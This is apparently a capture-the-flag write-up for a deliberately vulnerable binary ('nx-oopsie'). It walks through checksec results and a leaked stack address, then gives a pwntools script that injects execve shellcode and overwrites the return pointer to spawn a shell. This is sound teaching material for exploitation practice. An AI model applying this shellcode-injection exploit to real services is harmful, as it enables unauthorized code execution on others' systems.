# nx-oopsie

## Description

Attack this binary and get the flag!

```nc challenges.tamuctf.com 7234```

## Solution

```text
❯ checksec nx-oopsie
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

We have a 64 bit binary with no canary, writable/executable segments, and the name "nx-oopsie".  It seems pretty likely that we'll be executing shellcode on the stack.  Running the binary prints

```text
❯ ./nx-oopsie
Psst! I heard you might need this...: 0x7ffd07890fc0
What's your name? Teddy
Hi Teddy
! Pleased to meet you.
```

The address it prints is in the right range to be the stack and a quick check with gdb shows that address is 64 bytes after the location our input is saved in.  All we need to do is use the leaked address to calculate our shellcode location, feed the program shellcode as input, and then overwrite the saved return pointer with the location of our shellcode.  

```python
from pwn import *

BUF_SIZE = 72

p = process("./nx-oopsie")

stack_addr = int(p.recvline().decode().split(":")[1][1:],16)
# http://shell-storm.org/shellcode/files/shellcode-806.php
payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".ljust(BUF_SIZE, b'a')
payload += p64(stack_addr - 64)
p.sendline(payload)
p.interactive()
```